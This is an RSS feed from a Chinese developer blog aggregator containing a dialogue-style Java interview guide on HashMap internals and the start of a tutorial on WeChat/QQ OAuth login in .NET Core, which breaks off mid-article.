<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>HashMap？面试？我是谁？我在哪 - 卓庆森</title>
<link>http://www.cnblogs.com/zhuoqingsen/p/HashMap.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhuoqingsen/p/HashMap.html</guid>
<description>&lt;p&gt;　　现在是晚上11点了，学校屠猪馆的自习室因为太晚要关闭了，勤奋且疲惫的小鲁班也从屠猪馆出来了，正准备回宿舍洗洗睡，由于自习室位置比较偏僻所以是接收不到手机网络信号的，因此小鲁班从兜里掏出手机的时候，信息可真是炸了呀，小鲁班心想，微信群平时都没什么人聊天，今晚肯定是发生了什么大事，仔细一看，才发现原来是小鲁班的室友达摩（光头）拿到了阿里巴巴JAVA开发实习生的offer，此时小鲁班真替他室友感到高兴的同时，心里也难免会产生一丝丝的失落感，那是因为自己投了很多份简历，别说拿不拿得到offer，就连给面试邀的公司也都寥寥无几，小鲁班这会可真是受到了一万点&lt;strong&gt;真实暴击&lt;/strong&gt;，不过小鲁班还是很乐观的，很快调整了心态，带上耳机，慢慢的走回了宿舍，正打算准备向他那神室友达摩取取经。&lt;/p&gt;
&lt;p&gt;　　片刻后~&lt;/p&gt;
&lt;p&gt;　　小鲁班：666，听说你拿到了阿里的offer，能透露一下面试内容和技巧吗&lt;/p&gt;
&lt;p&gt;　　达摩：嘿嘿嘿，没问题鸭，叫声爸爸我就告诉你&lt;/p&gt;
&lt;p&gt;　　小鲁班：baba（表面笑嘻嘻，心里MMP）&lt;/p&gt;
&lt;p&gt;　　达摩：其实我也不是很记得了（请继续装），但我还是记得那么一些，如果你是面的JAVA，首先当然是&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;　　JAVA的基础知识：数据结构（Map,List,Set等）,设计模式，算法，线程相关，IO/NIO，序列化等等&lt;/li&gt;
&lt;li&gt;　　其次是高级特征：反射机制，并发与锁，JVM（GC策略，类加载机制，内存模型）等等&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　小鲁班：问这么多内容，那岂不是一个人都面试很久吗？&lt;/p&gt;
&lt;p&gt;　　达摩：不是的，面试官一般都会用连环炮的方式提问的。&lt;/p&gt;
&lt;p&gt;　　小鲁班：你说的连环炮是什么意思鸭？&lt;/p&gt;
&lt;p&gt;　　达摩：那我举个例子&lt;/p&gt;
&lt;p&gt;　　就比如问你HashMap是不是有序的？&lt;/p&gt;
&lt;p&gt;　　你回答不是有序的。那面试官就会可能继续问你，有没有有序的Map实现类呢？&lt;/p&gt;
&lt;p&gt;　　你如果这个时候说不知道的话，那这块问题就到此结束了。如果你说有TreeMap和LinkedHashMap。&lt;/p&gt;
&lt;p&gt;　　那么面试官接下来就可能会问你，TreeMap和LinkedHashMap是如何保证它的顺序的？&lt;/p&gt;
&lt;p&gt;　　如果你回答不上来，那么到此为止。如果你说TreeMap是通过实现SortMap接口，能够把它保存的键值对根据key排序，基于红黑树&lt;strong&gt;，&lt;/strong&gt;从而保证TreeMap中所有键值对处于有序状 态。LinkedHashMap则是通过插入排序（就是你put的时候的顺序是什么，取出来的时候就是什么样子）和访问排序（改变排序把访问过的放到底部）让键值有序。&lt;/p&gt;
&lt;p&gt;　　那么面试官还会继续问你，你觉得它们两个哪个的有序实现比较好？&lt;/p&gt;
&lt;p&gt;　　如果你依然可以回答的话，那么面试官会继续问你，你觉得还有没有比它更好或者更高效的实现方式。。无穷无尽深入，直到你回答不出来或者面试官认为问题到底了&lt;/p&gt;
&lt;p&gt;　　小鲁班捏了一把汗，我去。。。这是魔鬼吧，那我们来试试呗（因为小鲁班刚刚在自习室才看了这章的知识，想趁机装一波逼，毕竟刚刚叫了声爸爸~~）&lt;/p&gt;
&lt;p&gt;　　于是达摩and小鲁班就开始了对决：&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;1.为什么用HashMap？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;HashMap是一个散列桶（数组和链表），它存储的内容是键值对(key-value)映射&lt;/li&gt;
&lt;li&gt;HashMap采用了数组和链表的数据结构，能在查询和修改方便继承了数组的线性查找和链表的寻址修改&lt;/li&gt;
&lt;li&gt;HashMap是非synchronized，所以HashMap很快&lt;/li&gt;
&lt;li&gt;HashMap可以接受null键和值，而Hashtable则不能（原因就是equlas()方法需要对象，因为HashMap是后出的API经过处理才可以）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　&lt;strong&gt;2.HashMap的工作原理是什么？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;HashMap是基于hashing的原理，我们使用put(key, value)存储对象到HashMap中，使用get(key)从HashMap中获取对象。当我们给put()方法传递键和值时，我们先对键调用hashCode()方法，计算并返回的hashCode是用于找到Map数组的bucket位置来储存Node 对象。这里关键点在于指出，HashMap是在bucket中储存键对象和值对象，作为Map.Node 。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1294463/201811/1294463-20181119000932124-498988644.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;以下是HashMap初始化 ，简单模拟数据结构&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　  Node[] table=new Node[16]  散列桶初始化，table&lt;/p&gt;
&lt;p&gt;　　 class Node {&lt;/p&gt;
&lt;p&gt;　　　　hash;//hash值&lt;/p&gt;
&lt;p&gt;               key;//键&lt;/p&gt;
&lt;p&gt;　　　　value;//值&lt;/p&gt;
&lt;p&gt;　　　　node next;//用于指向链表的下一层（产生冲突，用拉链法）&lt;/p&gt;
&lt;p&gt;　　 }&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;以下是具体的put过程（JDK1.8版）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;          1.对Key求Hash值，然后再计算下标&lt;br/&gt;          2.如果没有碰撞，直接放入桶中（碰撞的意思是计算得到的Hash值相同，需要放到同一个bucket中）&lt;br/&gt;          3.如果碰撞了，以链表的方式链接到后面&lt;br/&gt;          4.如果链表长度超过阀值( TREEIFY THRESHOLD==8)，就把链表转成红黑树，链表长度低于6，就把红黑树转回链表&lt;br/&gt;          5.如果节点已经存在就替换旧值&lt;br/&gt;          6.如果桶满了(容量16*加载因子0.75)，就需要 resize（扩容2倍后重排）&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;以下是具体get过程(考虑特殊情况如果两个键的hashcode相同，你如何获取值对象？)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　当我们调用get()方法，HashMap会使用键对象的hashcode找到bucket位置，找到bucket位置之后，会调用keys.equals()方法去找到链表中正确的节点，最终找到要找的值对象。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1294463/201811/1294463-20181119002141457-19724606.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;3.有什么方法可以减少碰撞？&lt;/strong&gt;&lt;strong&gt;&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;扰动函数可以减少碰撞，原理是如果两个不相等的对象返回不同的hashcode的话，那么碰撞的几率就会小些，这就意味着存链表结构减小，这样取值的话就不会频繁调用equal方法，这样就能提高HashMap的性能。（扰动即Hash方法内部的算法实现，目的是让不同对象返回不同hashcode。）&lt;/li&gt;
&lt;li&gt;使用不可变的、声明作final的对象，并且采用合适的equals()和hashCode()方法的话，将会减少碰撞的发生。不可变性使得能够缓存不同键的hashcode，这将提高整个获取对象的速度，使用String，Interger这样的wrapper类作为键是非常好的选择。为什么String, Interger这样的wrapper类适合作为键？因为String是final的，而且已经重写了equals()和hashCode()方法了。不可变性是必要的，因为为了要计算hashCode()，就要防止键值改变，如果键值在放入时和获取时返回不同的hashcode的话，那么就不能从HashMap中找到你想要的对象。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　&lt;strong&gt;4.HashMap中hash函数怎么是是实现的?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;我们可以看到在hashmap中要找到某个元素，需要根据key的hash值来求得对应数组中的位置。如何计算这个位置就是hash算法。前面说过hashmap的数据结构是数组和链表的结合，所以我们当然希望这个hashmap里面的元素位置尽量的分布均匀些，尽量使得每个位置上的元素数量只有一个，那么当我们用hash算法求得这个位置的时候，马上就可以知道对应位置的元素就是我们要的，而不用再去遍历链表。 所以我们首先想到的就是&lt;strong&gt;把hashcode对数组长度取模运算&lt;/strong&gt;，这样一来，元素的分布相对来说是比较均匀的。但是，“模”运算的消耗还是比较大的，能不能找一种更快速，消耗更小的方式，我们来看看JDK1.8的源码是怎么做的（被楼主修饰了一下）&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; hash(Object key) {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (key == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; 0&lt;span&gt;;
    }
     &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; h;
     h&lt;/span&gt;=&lt;span&gt;key.hashCode()；返回散列值也就是hashcode
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ^ ：按位异或
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; &amp;gt;&amp;gt;&amp;gt;:无符号右移，忽略符号位，空位都以0补齐
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;其中n是数组的长度，即Map的数组部分初始化长度&lt;/span&gt;
     &lt;span&gt;return&lt;/span&gt;  (n-1)&amp;amp;(h ^ (h &amp;gt;&amp;gt;&amp;gt; 16&lt;span&gt;));
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1294463/201811/1294463-20181119224252423-2018084724.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　简单来说就是&lt;/p&gt;
&lt;p&gt;          1.高16bt不变，低16bit和高16bit做了一个异或(得到的HASHCODE转化为32位的二进制，前16位和后16位低16bit和高16bit做了一个异或)&lt;br/&gt;          2.(n·1)&amp;amp;hash=-&amp;gt;得到下标&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;5.为什么要用红黑树？为什么不一直使用红黑树？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;为了解决二叉查找树的缺陷，二叉查找树在特殊情况下会变成一个线性结构，查找会非常慢。我们知道红黑树属于平衡二叉树，但是为了保持“平衡”是需要付出代价的，红黑树在插入新数据后可能需要通过左旋，右旋、变色这些操作来保持平衡，引入红黑树就是为了查找数据快，如果链表长度很短的话，根本不需要引入红黑树。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　6.说说你对红黑树的见解？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1294463/201811/1294463-20181119224633228-1433434325.png&quot; alt=&quot;&quot; width=&quot;313&quot; height=&quot;226&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;&lt;li&gt;每个节点非红即黑&lt;/li&gt;
&lt;li&gt;根节点总是黑色的&lt;/li&gt;
&lt;li&gt;如果节点是红色的，则它的子节点必须是黑色的（反之不一定）&lt;/li&gt;
&lt;li&gt;每个叶子节点都是黑色的空节点（NIL节点）&lt;/li&gt;
&lt;li&gt;从根节点到叶节点或空子节点的每条路径，必须包含相同数目的黑色节点（即相同的黑色高度）&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;　&lt;strong&gt;　7.解决hash 碰撞还有那些办法？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;开放定址法。&lt;/p&gt;
&lt;p&gt;　　当冲突发生时，使用某种探查技术在散列表中形成一个探查(测)序列。沿此序列逐个单元地查找，直到找到给定的地址。&lt;/p&gt;
&lt;p&gt;　　按照形成探查序列的方法不同，可将开放定址法区分为线性探查法、二次探查法、双重散列法等。&lt;/p&gt;
&lt;p&gt;　　下面给一个线性探查法的例子　　&lt;/p&gt;
&lt;p&gt;　　问题：已知一组关键字为(26，36，41，38，44，15，68，12，06，51)，用除余法构造散列函数，用线性探查法解决冲突构造这组关键字的散列表。&lt;/p&gt;
&lt;p&gt;　　解答：为了减少冲突，通常令装填因子α由除余法因子是13的散列函数计算出的上述关键字序列的散列地址为(0，10，2，12，5，2，3，12，6，12)。&lt;/p&gt;
&lt;p&gt;　    前5个关键字插入时，其相应的地址均为开放地址，故将它们直接插入T[0]，T[10)，T[2]，T[12]和T[5]中。&lt;br data-filtered=&quot;filtered&quot;/&gt;
　　当插入第6个关键字15时，其散列地址2(即h(15)=15％13=2)已被关键字41(15和41互为同义词)占用。故探查h1=(2+1)％13=3，此地址开放，所以将15放入T[3]中。&lt;br data-filtered=&quot;filtered&quot;/&gt;
　   当插入第7个关键字68时，其散列地址3已被非同义词15先占用，故将其插入到T[4]中。&lt;br data-filtered=&quot;filtered&quot;/&gt;
　   当插入第8个关键字12时，散列地址12已被同义词38占用，故探查hl=(12+1)％13=0，而T[0]亦被26占用，再探查h2=(12+2)％13=1，此地址开放，可将12插入其中。&lt;br data-filtered=&quot;filtered&quot;/&gt;
　   类似地，第9个关键字06直接插入T[6]中；而最后一个关键字51插人时，因探查的地址12，0，1，…，6均非空，故51插入T[7]中。&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;8.如果HashMap的大小超过了负载因子(load factor)定义的容量，怎么办？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　默认的负载因子大小为0.75，也就是说，当一个map填满了75%的bucket时候，和其它集合类(如ArrayList等)一样，将会创建原来HashMap大小的两倍的bucket数组，来重新调整map的大小，并将原来的对象放入新的bucket数组中。这个过程叫作rehashing，因为它调用hash方法找到新的bucket位置。这个值只可能在两个地方，一个是原下标的位置，另一种是在下标为&amp;lt;原下标+原容量&amp;gt;的位置　　&lt;/p&gt;

&lt;p&gt;　   &lt;strong&gt;9.重新调整HashMap大小存在什么问题吗？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;当重新调整HashMap大小的时候，确实存在条件竞争，因为如果两个线程都发现HashMap需要重新调整大小了，它们会同时试着调整大小。在调整大小的过程中，存储在链表中的元素的次序会反过来，因为移动到新的bucket位置的时候，HashMap并不会将元素放在链表的尾部，而是放在头部，这是为了避免尾部遍历(tail traversing)。如果条件竞争发生了，那么就死循环了。(多线程的环境下不使用HashMap）&lt;/li&gt;
&lt;li&gt;为什么多线程会导致死循环，它是怎么发生的？&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　HashMap的容量是有限的。当经过多次元素插入，使得HashMap达到一定饱和度时，Key映射位置发生冲突的几率会逐渐提高。这时候，HashMap需要扩展它的长度，也就是  　　进行Resize。1.扩容：创建一个新的Entry空数组，长度是原数组的2倍。2.ReHash：遍历原Entry数组，把所有的Entry重新Hash到新数组。&lt;/p&gt;
&lt;p&gt;     （这个过程比较烧脑，暂不作流程图演示，有兴趣去看看我的另一篇博文&quot;HashMap扩容全过程&quot;）&lt;/p&gt;

&lt;p&gt;　　达摩：哎呦，小老弟不错嘛~~意料之外呀&lt;/p&gt;
&lt;p&gt;　　小鲁班：嘿嘿，优秀吧，中场休息一波，我先喝口水&lt;/p&gt;
&lt;p&gt;　　达摩：不仅仅是这些哦，面试官还会问你相关的集合类对比，比如：&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;10.HashTable&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;数组 + 链表方式存储&lt;/li&gt;
&lt;li&gt;默认容量： 11(质数 为宜)&lt;/li&gt;
&lt;li&gt;put:
&lt;ul&gt;&lt;li&gt;索引计算 : （key.hashCode() &amp;amp; 0x7FFFFFFF）% table.length&lt;/li&gt;
&lt;li&gt;若在链表中找到了，则替换旧值，若未找到则继续&lt;/li&gt;
&lt;li&gt;当总元素个数超过容量*加载因子时，扩容为原来 2 倍并重新散列。&lt;/li&gt;
&lt;li&gt;将新元素加到链表头部&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;对修改 Hashtable 内部共享数据的方法添加了 synchronized，保证线程安全。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　&lt;strong&gt;11.HashMap ，HashTable 区别&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;默认容量不同。扩容不同&lt;/li&gt;
&lt;li&gt;线程安全性，HashTable 安全&lt;strong&gt;  &lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;效率不同 HashTable 要慢因为加锁&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　&lt;strong&gt;12.ConcurrentHashMap 原理&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;最大特点是引入了 CAS（借助 Unsafe 来实现【native code】）
&lt;ol&gt;&lt;li&gt;CAS有3个操作数，内存值V，旧的预期值A，要修改的新值B。当且仅当预期值A和内存值V相同时，将内存值V修改为B，否则什么都不做。&lt;/li&gt;
&lt;li&gt;Unsafe 借助 CPU 指令 cmpxchg 来实现&lt;/li&gt;
&lt;li&gt;使用实例：
&lt;ol&gt;&lt;li&gt;对 sizeCtl 的控制都是用 CAS 来实现的&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote&gt;
&lt;ol&gt;&lt;li&gt;sizeCtl ：默认为0，用来控制 table 的初始化和扩容操作。
&lt;ul&gt;&lt;li&gt;-1 代表table正在初始化&lt;/li&gt;
&lt;li&gt;N 表示有 -N-1 个线程正在进行扩容操作&lt;/li&gt;
&lt;li&gt;如果table未初始化，表示table需要初始化的大小。&lt;/li&gt;
&lt;li&gt;如果table初始化完成，表示table的容量，默认是table大小的0.75倍，居然用这个公式算0.75（n - (n &amp;gt;&amp;gt;&amp;gt; 2)）。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;CAS 会出现的问题：ABA
&lt;ul&gt;&lt;li&gt;对变量增加一个版本号，每次修改，版本号加 1，比较的时候比较版本号。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;　　&lt;strong&gt;13.我们可以使用CocurrentHashMap来代替Hashtable吗？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;我们知道Hashtable是synchronized的，但是ConcurrentHashMap同步性能更好，因为它仅仅根据同步级别对map的一部分进行上锁。ConcurrentHashMap当然可以代替HashTable，但是HashTable提供更强的线程安全性。它们都可以用于多线程的环境，但是当Hashtable的大小增加到一定的时候，性能会急剧下降，因为迭代时需要被锁定很长的时间。因为ConcurrentHashMap引入了分割(segmentation)，不论它变得多么大，仅仅需要锁定map的某个部分，而其它的线程不需要等到迭代完成才能访问map。简而言之，在迭代的过程中，ConcurrentHashMap仅仅锁定map的某个部分，而Hashtable则会锁定整个map。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;　　此时躺着床上的张飞哄了一声：睡觉了睡觉了~&lt;/p&gt;
&lt;p&gt;　　见此不太妙：小鲁班立马回到床上（泉水），把被子盖过头，心里有一丝丝愉悦感，不对。好像还没洗澡。。。&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;转载请注明出处，谢谢&lt;/strong&gt;&lt;/p&gt;







</description>
<pubDate>Mon, 19 Nov 2018 15:24:00 +0000</pubDate>
<dc:creator>卓庆森</dc:creator>
<og:description>现在是晚上11点了，学校屠猪馆的自习室因为太晚要关闭了，勤奋且疲惫的小鲁班也从屠猪馆出来了，正准备回宿舍洗洗睡，由于自习室位置比较偏僻所以是接收不到手机网络信号的，因此小鲁班从兜里掏出手机的时候，信息</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhuoqingsen/p/HashMap.html</dc:identifier>
</item>
<item>
<title>.net core 2.x - 微信、QQ 授权登录 - eSoftor</title>
<link>http://www.cnblogs.com/Tmc-Blog/p/9986482.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Tmc-Blog/p/9986482.html</guid>
<description>&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;上一篇是关于模拟请求配置，包括域名问题的解决，本篇就说下授权登录。嗯，比较闲。以前的fx 开发web的时候好像使用的 微信提供的js插件生成二维码，然后扫码登录，，，记不清了，好久不开发微信了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt; &lt;/h3&gt;
&lt;h3&gt;1.准备工作。&lt;/h3&gt;
&lt;h4&gt;1.1.单独解决ajax的跨域问题&lt;/h4&gt;
&lt;p&gt;首先考虑到web端（ajax）跨域的问题，所以我们首先要解决的就是在core中配置跨域的设置（案例比较多所以不多说只贴代码）：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ConfigureServices中&lt;/span&gt;
services.AddCors(options =&amp;gt;&lt;span&gt;
            {
                options.AddPolicy(&lt;/span&gt;&lt;span&gt;&quot;Allow&lt;/span&gt;&lt;span&gt;CORS&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                builder &lt;/span&gt;=&amp;gt;&lt;span&gt;
                {
                    builder.WithOrigins(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;http://s86zxm.natappfree.cc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;http://127.0.0.1:65502&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).AllowAnyHeader().AllowAnyMethod().AllowCredentials();
                });
            });

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Configure中（一定是在 app.UserMvc())之前配置）&lt;/span&gt;
app.UseCors(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;AllowCORS&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;a)这里的临时域名就是我们上篇说的基于natapp生成的动态的。&lt;/p&gt;
&lt;p&gt;b)这里的 UseCors一定是要在app.UseMvc()之前；另外我这里是全局配置，如果您需要针对 controller或者action单独配置，可以去掉这里的app.usecors,在每个controller上或者action上加上EnableCors(&quot;跨域策略名称&quot;)，我们这里的策略名称是AllowCORS。&lt;/p&gt;
&lt;p&gt;ajax中的请求方式，要注意以下几个点：&lt;/p&gt;
&lt;p&gt;async: true,&lt;span&gt;//Failed to execute 'send' on 'XMLHttpRequest'&lt;/span&gt;&lt;br/&gt;dataType: 'jsonp',&lt;br/&gt;crossDomain: true,&lt;/p&gt;
&lt;p&gt;&lt;span&gt;需要指定ajax的这三个属性，其中第一个 如果使用 false，也就似乎非异步方式，会出现后面红色的错误提示。大致的参考脚本如下：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;$.ajax({
                    type: &lt;/span&gt;'get'&lt;span&gt;,
                    async: &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;,&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Failed to execute 'send' on 'XMLHttpRequest'&lt;/span&gt;
                    dataType: 'jsonp'&lt;span&gt;,
                    crossDomain: &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;,
                    url: &lt;/span&gt;'/api/identity/OAuth2?provider=Weixin&amp;amp;returnUrl=/'&lt;span&gt;,
                    success: &lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; (res) {
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;do something &lt;/span&gt;
                    }, error: &lt;span&gt;function&lt;/span&gt;&lt;span&gt; (xhr, err) {
                        console.log(xhr.statusCode);
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;do something &lt;/span&gt;
&lt;span&gt;                    }
                });&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;1.2.解决配置问题&lt;/h4&gt;
&lt;p&gt;a) 这里的配置指的是，比如微信开发域名的问题,这个问题在上一篇中，有说到，如果不知道的可以点这里 &lt;a href=&quot;https://www.cnblogs.com/Tmc-Blog/p/9966796.html&quot; target=&quot;_blank&quot;&gt;域名配置&lt;/a&gt;  &lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;b) 另一个就是 配置微信或者QQ的 appId和AppSecret,这个获取方式上一篇有说（微信），QQ类似；在我们的 core项目中配置，参考如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;configureService中配置&lt;/span&gt;
services.AddAuthentication().AddWeixinAuthentication(options =&amp;gt;&lt;span&gt;
            {
                options.ClientId &lt;/span&gt;= Configuration[&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Authentication:WeChat:AppId&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;];
                options.ClientSecret &lt;/span&gt;= Configuration[&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Authentication:WeChat:AppKey&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;];
            });
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;configures中使用&lt;/span&gt;
&lt;span&gt;app.UseAuthentication();
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;配置文件中：&lt;/span&gt;
&lt;span&gt;{
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ESoftor&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:{
       &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Authentication&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
              &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;WeChat&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
                   &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;AppId&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;你的微信AppId&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                   &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;AppKey&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;你的微信secret&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
                }
        }  
     }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;以上这些完成之后，我们就一切就绪了，重点来了，代码：&lt;/p&gt;

&lt;h3&gt;2.授权实现&lt;/h3&gt;
&lt;p&gt;以下五个相关文件直接复制到项目（不需要做任何改动），便可直接使用，本人已全部测试通过，，谢谢配合。&lt;/p&gt;
&lt;p&gt;WeixinAuthenticationDefaults.cs&lt;/p&gt;
